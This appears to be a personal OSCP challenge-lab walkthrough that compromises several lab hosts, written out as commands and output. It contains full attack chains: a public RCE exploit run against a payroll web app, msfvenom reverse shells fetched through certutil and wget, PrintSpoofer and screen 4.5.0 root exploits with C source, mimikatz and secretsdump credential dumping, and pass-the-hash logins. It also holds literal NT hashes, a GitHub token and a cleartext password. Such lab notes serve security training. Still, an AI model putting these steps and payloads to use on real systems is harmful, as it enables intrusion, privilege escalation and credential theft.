
#### Credentials


#### Users
Mary.Williams
Celia.almeda
Administrator

#### Passwords


#### Pathways


#### Workstation and Server Names
.143 - local and proof (standalone) - AERO
.144 - local and proof (standalone) - Crystal
.145 - local and proof (standalone) - Hermes

.140 - proof only (domain joined - DC01) 
.141 - NONE (domain joined - MS01)
.142 - NONE (domain joined - MS02)


#### 140
1. Nmap Scan
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ proxychains nmap -sT --top-ports=20 10.10.115.140  

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   open   domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy

┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$  proxychains nmap -sT -p 5985 10.10.115.140
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-18 00:17 EST
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.115.140:80 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.115.140:5985  ...  OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.10.115.140
Host is up (14s latency).

PORT     STATE SERVICE
5985/tcp open  wsman

```

2. Login with DC admin tom_admin hash.  Obtained proof. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ proxychains evil-winrm -i 10.10.115.140 -u 'tom_admin' -H '4979d69d4ca66955c075c41cf45f24dc'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt
53c1d9921acbd5c7aaf2b76a51e992e0

```


#### 141
1. Open port scan with rustscan
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ rustscan 192.168.225.141 

PORT      STATE SERVICE        REASON
22/tcp    open  ssh            syn-ack
80/tcp    open  http           syn-ack
81/tcp    open  hosts2-ns      syn-ack
135/tcp   open  msrpc          syn-ack
139/tcp   open  netbios-ssn    syn-ack
445/tcp   open  microsoft-ds   syn-ack
3306/tcp  open  mysql          syn-ack
3307/tcp  open  opsession-prxy syn-ack
5040/tcp  open  unknown        syn-ack
5985/tcp  open  wsman          syn-ack
7680/tcp  open  pando-pub      syn-ack
47001/tcp open  winrm          syn-ack
49664/tcp open  unknown        syn-ack
49665/tcp open  unknown        syn-ack
49666/tcp open  unknown        syn-ack
49667/tcp open  unknown        syn-ack
49668/tcp open  unknown        syn-ack
49669/tcp open  unknown        syn-ack
49670/tcp open  unknown        syn-ack
53570/tcp open  unknown        syn-ack
```

2. Nmap scan of open ports. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ nmap -p$(cat 141-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.225.141 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 19:03 EST
Nmap scan report for 192.168.225.141
Host is up (0.34s latency).

PORT      STATE  SERVICE         VERSION
22/tcp    open   ssh             OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
80/tcp    open   http            Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-title: Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: Nicepage 4.8.2, nicepage.com
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
81/tcp    open   http            Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-title: Attendance and Payroll System
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open   msrpc           Microsoft Windows RPC
139/tcp   open   netbios-ssn     Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
3306/tcp  open   mysql           MySQL (unauthorized)
3307/tcp  open   opsession-prxy?
| fingerprint-strings: 
|   NULL, SSLSessionReq, TerminalServerCookie: 
|_    Host '192.168.45.242' is not allowed to connect to this MariaDB server
5040/tcp  open   unknown
5985/tcp  open   http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  closed pando-pub
47001/tcp open   http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc           Microsoft Windows RPC
49665/tcp open   msrpc           Microsoft Windows RPC
49666/tcp open   msrpc           Microsoft Windows RPC
49667/tcp open   msrpc           Microsoft Windows RPC
49668/tcp open   msrpc           Microsoft Windows RPC
49669/tcp open   msrpc           Microsoft Windows RPC
49670/tcp open   msrpc           Microsoft Windows RPC
53570/tcp open   msrpc           Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3307-TCP:V=7.94SVN%I=7%D=2/17%Time=65D1494A%P=x86_64-pc-linux-gnu%r
SF:(NULL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.242'\x20is\x20not\x2
SF:0allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSes
SF:sionReq,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.242'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Term
SF:inalServerCookie,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.242'\x20i
SF:s\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server
SF:");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-18T00:06:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 188.37 seconds
```

2. Found attendance and payroll system in port 81. So looked for public exploit. 
```
                                                                                                   
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ searchsploit Attendance                    
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
Attendance and Payroll System v1.0 - Remote Code Execution (RCE)  | php/webapps/50801.py
Attendance and Payroll System v1.0 - SQLi Authentication Bypass   | php/webapps/50802.py
```

3. At the mean time did directory search on both port 80 and 81, found login page at port 81 and started hydra attack. Unsuccessful. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ hydra 192.168.225.141 -s 81 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/admin/login.php:username=^USER^&password=^PASS^&login=:Incorrect password"
```

4. Clean exploit with right upload path, line 41 and 42 
```
upload_path = '/admin/employee_edit_photo.php'
shell_path = '/images/shell.php'
```

5. Run exploit. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ python3 50801.py http://192.168.225.141:81/


──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ python3 50801.py http://192.168.225.141:81/

    >> Attendance and Payroll System v1.0
    >> Unauthenticated Remote Code Execution
    >> By pr0z

[*] Uploading the web shell to http://192.168.225.141:81/
[*] Validating the shell has been uploaded to http://192.168.225.141:81/
[✓] Successfully connected to web shell

RCE >
```

6. Since current foothold is highly restrictive so gain another shell with msfvenom. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=4545 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe


RCE > certutil -urlcache -f http://192.168.45.242/reverse.exe reverse1.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

RCE > .\reverse1.exe

┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ sudo nc -nvlp 4545
sudo: unable to resolve host kali: Name or service not known
listening on [any] 4545 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.225.141] 60531
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\wamp64\attendance\images>
```

7. Checked out current user privileges. 
```
PS C:\> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

8. Transfer printproof64.exe and run and get system contro. 
```
PS C:\users\Mary.Williams\Desktop> iwr -uri http://192.168.45.242/PrintSpoofer64.exe  -Outfile PrintSpoofer64.exe
iwr -uri http://192.168.45.242/PrintSpoofer64.exe  -Outfile PrintSpoofer64.exe
PS C:\users\Mary.Williams\Desktop> .\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> 
```


9. Use mimikatz to get other user hashes. 
```
PS C:\Users\Administrator\Desktop> certutil -urlcache -f http://192.168.45.242/mimikatz.exe mimikatz.exe
certutil -urlcache -f http://192.168.45.242/mimikatz.exe mimikatz.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Users\Administrator\Desktop> powershell -exec bypass

PS C:\Users\Administrator\Desktop> .\mimikatz.exe

mimikatz # privilege::debug

mimikatz # sekurlsa::logonpasswords

Mary.Williams:9a3121977ee93af56ebd0ef4f527a35e - unable to crack hashcat

celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd - unable to crack hashct
```

10. Tried pass the hash to connect but unsuccessful. 

#### 142
1. Nmap scan. 
```
──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ proxychains nmap -sT --top-ports=20 10.10.115.142


PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy

┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ proxychains nmap -sT -p 5985 10.10.115.142
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 22:40 EST
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.115.142:80 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.115.142:5985  ...  OK
Nmap scan report for 10.10.115.142
Host is up (2.7s latency).

PORT     STATE SERVICE
5985/tcp open  wsman
```

2. Winrm pass the hash to access account celia with ms02 host
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ proxychains evil-winrm -i 10.10.115.142 -u 'celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd'

*Evil-WinRM* PS C:\Users\celia.almeda> whoami
oscp\celia.almeda
*Evil-WinRM* PS C:\Users\celia.almeda> hostname
MS02
```

3. Found SAM and SYSTEM info on MS02
```
*Evil-WinRM* PS C:\windows.old\windows\system32> dir
-a----          4/4/2022   6:00 AM          57344 SAM
-a----          4/4/2022   6:00 AM       11636736 SYSTEM
```

4. Download both on local kali
```
*Evil-WinRM* PS C:\windows.old\windows\system32> download C:\windows.old\Windows\System32\SYSTEM /home/kali/SYSTEM
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.115.142:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.115.142:5985  ...  OK
                                        
Info: Downloading C:\windows.old\Windows\System32\SYSTEM to /home/kali/SYSTEM
                                        
Info: Download successful!
*Evil-WinRM* PS C:\windows.old\windows\system32> download C:\windows.old\Windows\System32\SAM /home/kali/SAM
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.115.142:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.115.142:5985  ...  OK
                                        
Info: Downloading C:\windows.old\Windows\System32\SAM to /home/kali/SAM

```

5. Dump hashes of sam and system. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 
```

6. Found hash of DC admin user tom_cat


#### 143
1. Rustscan
```
─(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ rustscan 192.168.225.143

PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack
22/tcp   open  ssh        syn-ack
80/tcp   open  http       syn-ack
81/tcp   open  hosts2-ns  syn-ack
443/tcp  open  https      syn-ack
3000/tcp open  ppp        syn-ack
3001/tcp open  nessus     syn-ack
3003/tcp open  cgms       syn-ack
3306/tcp open  mysql      syn-ack
5432/tcp open  postgresql syn-ack

```

2. Nmap 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ sudo nmap -p$(cat 143-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.225.143
sudo: unable to resolve host kali: Name or service not known
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-18 00:49 EST
Nmap scan report for 192.168.225.143
Host is up (0.31s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 23:4c:6f:ff:b8:52:29:65:3d:d1:4e:38:eb:fe:01:c1 (RSA)
|   256 0d:fd:36:d8:05:69:83:ef:ae:a0:fe:4b:82:03:32:ed (ECDSA)
|_  256 cc:76:17:1e:8e:c5:57:b2:1f:45:28:09:05:5a:eb:39 (ED25519)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Test Page for the Nginx HTTP Server on Fedora
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp  open  http       Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  ppp?
3001/tcp open  nessus?
3003/tcp open  cgms?
3306/tcp open  mysql      MySQL (unauthorized)
5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
| fingerprint-strings: 
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2113
|_    RProcessStartupPacket
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=aero
| Subject Alternative Name: DNS:aero
| Not valid before: 2021-05-10T22:20:48
|_Not valid after:  2031-05-08T22:20:48
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3003-TCP:V=7.94SVN%I=7%D=2/18%Time=65D19A64%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTSP
SF:Request,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalServer
SF:Cookie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDStri
SF:ng,1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5432-TCP:V=7.94SVN%I=7%D=2/18%Time=65D19A60%P=x86_64-pc-linux-gnu%r
SF:(SMBProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fron
SF:tend\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\x
SF:203\.0\0Fpostmaster\.c\0L2113\0RProcessStartupPacket\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 4 hops
Service Info: Host: 192.168.225.143; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   312.44 ms 192.168.45.1
2   312.36 ms 192.168.45.254
3   313.04 ms 192.168.251.1
4   312.93 ms 192.168.225.143

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.62 seconds
```

3. Found out subdirectory with service after many trail and error. 
```
feroxbuster http://192.168.225.143/api/heartbeat

0	
serviceName	"mysql"
status	"online"
1	
serviceName	"postgres"
status	"online"
2	
serviceName	"aerospike"
status	"online"
3	
serviceName	"OpenSSH"
status	"online"
```

4. Exploitering service aerospike. 
```
searchsploit aerospike

Aerospike Database 5.1.0.3 - OS Command Execution          | multiple/remote/49067.py
https://www.exploit-db.com/exploits/49067

from google search (download both file)
https://github.com/b4ny4n/CVE-2020-13151/blob/master/poc.lua
https://github.com/b4ny4n/CVE-2020-13151/blob/master/cve2020-13151.py
```

5. Running scripts and then getting reverse shell. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ python3 cve2020-13151.py --ahost 192.168.225.143 --pythonshell --lhost=192.168.45.242 --lport 80
[+] aerospike build info: 5.1.0.1

[+] looks vulnerable
[+] populating dummy table.
[+] writing to test.cve202013151
[+] wrote pRBieUqQApxPpNzU
[+] registering udf
[+] sending payload, make sure you have a listener on 192.168.45.242:80.....

┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.225.143] 34176
/bin/sh: 0: can't access tty; job control turned off
$ SHELL=/bin/bash script -q /dev/null
bash: /root/.bashrc: Permission denied
aero@oscp:/$ 
```

6. Obtained local.txt
```
cat local.txt
c0962dcf3b94132e9f0f178ef0b6ed9f
```

7. Find out SUID binary screen 4.5.0, vulnerable, confirmed by linpeas too. 
```
https://www.exploit-db.com/exploits/41154
```

8. Peformed PE which was very complex. 
```
1. Created two required files. 

┌──(kali㉿kali)-[~/OSCP/labs/oscpa/XenSpawn]
└─$ cat rootshell.c 
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}

┌──(kali㉿kali)-[~/OSCP/labs/oscpa/XenSpawn]
└─$ cat libhax.c                    
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}

2. For GCC need to use xenspwan because the new version compiler is not supported in the machine. 

3. Downloaded and created another docker machine. 

# Clone the repo locally, or download the script
kali@kali:~$ git clone https://github.com/X0RW3LL/XenSpawn.git

# cd into the cloned repo
kali@kali:~$ cd XenSpawn/

# Make the script executable
kali@kali:~/XenSpawn$ chmod +x spawn.sh

# Note: the script must be run as root
# Note: MACHINE_NAME is a custom name you will be
#       spawning the container with
kali@kali:~/XenSpawn$ sudo ./spawn.sh MACHINE_NAME

# Starting the newly spawned container
# Note: MACHINE_NAME is to be replaced with the machine name of choice
kali@kali:~/XenSpawn$ sudo systemd-nspawn -M MACHINE_NAME

Spawning container MACHINE_NAME on /var/lib/machines/MACHINE_NAME.
Press ^] three times within 1s to kill container.

root@MACHINE_NAME:~$ exit
logout
Container MACHINE_NAME exited successfully.

4. Complies files. 

┌──(root㉿kali)-[/home/…/OSCP/labs/oscpa/XenSpawn]
└─# systemd-nspawn -M screen
Spawning container screen on /var/lib/machines/screen.
Press Ctrl-] three times within 1s to kill container.
root@screen:~# ls
libhax.c  rootshell.c

root@screen:~# gcc -fPIC -shared -ldl -o libhax.so libhax.c 
libhax.c: In function ‘dropshell’:
libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^
root@screen:~# gcc -o rootshell rootshell.c
rootshell.c: In function ‘main’:
rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^
root@screen:~# ls -l libhax.so rootshell
-rwxr-xr-x 1 root root 8264 Feb 18 07:36 libhax.so
-rwxr-xr-x 1 root root 8808 Feb 18 07:36 rootshell


5. Upload compiled files and execute scripts. 
aero@oscp:/home/aero$ cd /tmp
cd /tmp
aero@oscp:/tmp$ wget http://192.168.45.242/libhax.so
wget http://192.168.45.242/libhax.so
--2024-02-18 12:41:12--  http://192.168.45.242/libhax.so
Connecting to 192.168.45.242:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8264 (8.1K) [application/octet-stream]
Saving to: ‘libhax.so’

libhax.so           100%[===================>]   8.07K  --.-KB/s    in 0.01s   

2024-02-18 12:41:13 (643 KB/s) - ‘libhax.so’ saved [8264/8264]

aero@oscp:/tmp$ wget http://192.168.45.242/rootshell
wget http://192.168.45.242/rootshell
--2024-02-18 12:41:31--  http://192.168.45.242/rootshell
Connecting to 192.168.45.242:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8808 (8.6K) [application/octet-stream]
Saving to: ‘rootshell’

rootshell           100%[===================>]   8.60K  --.-KB/s    in 0.01s   

2024-02-18 12:41:31 (640 KB/s) - ‘rootshell’ saved [8808/8808]

aero@oscp:/tmp$ cd /etc/
cd /etc/
aero@oscp:/etc$ umask 000
umask 000
aero@oscp:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
< -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
aero@oscp:/etc$ cat ld.so.preload
cat ld.so.preload
cat: ld.so.preload: No such file or directory
aero@oscp:/etc$ ls -l /tmp/rootshell 
ls -l /tmp/rootshell 
-rwsr-xr-x 1 root root 8808 Feb 18 12:40 /tmp/rootshell
aero@oscp:/etc$ /tmp/rootshell
/tmp/rootshell
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

9. Obtained proof
```
# cat proof.txt
cat proof.txt
b4dde52de88f8bcfa7b9792d592b32cc
```

#### 144
1. Rustscan
```
rustscan 192.168.225.144

21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```
2. Nmap
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ nmap -p$(cat 144-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.225.144
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-18 08:34 EST
Nmap scan report for 192.168.225.144
Host is up (0.32s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-git: 
|   192.168.225.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update 
|     Remotes:
|_      https://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@github.com/PWK-Challenge-Lab/dev.git
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: Nicepage 4.21.12, nicepage.com
|_http-title: Home
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.79 seconds
```

3. Found out .git sub-directory so, download everything to local machine using git dumper. 
```
https://github.com/arthaud/git-dumper

┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ ./git_dumper.py http://192.168.218.144/.git . 
```

4. Check out git commits. Find out ssh creds. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ git show                                                   
commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@challenge.lab";
-    private $password = "BreakingBad92";
+    private $username = "";
+    private $password = "";
+// Cleartext creds cannot be added to public repos!
     public $conn;
     public function getConnection() {
         $this->conn = null;

Stuart:BreakingBad92

```

5. SSH login. and thoroughly check each folder. Obtained local.txt 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ ssh stuart@192.168.218.144   

stuart@oscp:~$ cat local.txt
fb4cbe759601ac9ebf7ccc27e3a228d0
```

6. Found three backup zip files. and transfer them to local machine. 
```
stuart@oscp:/opt/backup$ ls
sitebackup1.zip  sitebackup2.zip  sitebackup3.zip

┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ sudo systemctl start ssh 

stuart@oscp:/opt/backup$ scp sitebackup1.zip kali@192.168.45.242:/home/kali/OSCP/labs/oscpa/
The authenticity of host '192.168.45.242 (192.168.45.242)' can't be established.
ED25519 key fingerprint is SHA256:iiY1KYmCzkekH79Vu14hbceL14X6b2ROAhqQCN+Lyew.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.45.242' (ED25519) to the list of known hosts.
kali@192.168.45.242's password: 
sitebackup1.zip                           100%   26KB  40.8KB/s   00:00    
stuart@oscp:/opt/backup$ scp sitebackup2.zip kali@192.168.45.242:/home/kali/OSCP/labs/oscpa/
kali@192.168.45.242's password: 
sitebackup2.zip                           100%   24KB  36.9KB/s   00:00    
stuart@oscp:/opt/backup$ scp sitebackup3.zip kali@192.168.45.242:/home/kali/OSCP/labs/oscpa/
kali@192.168.45.242's password: 
sitebackup3.zip  
```

6. Crack sitebackup3.zip
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ zip2john sitebackup3.zip > hash1

┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
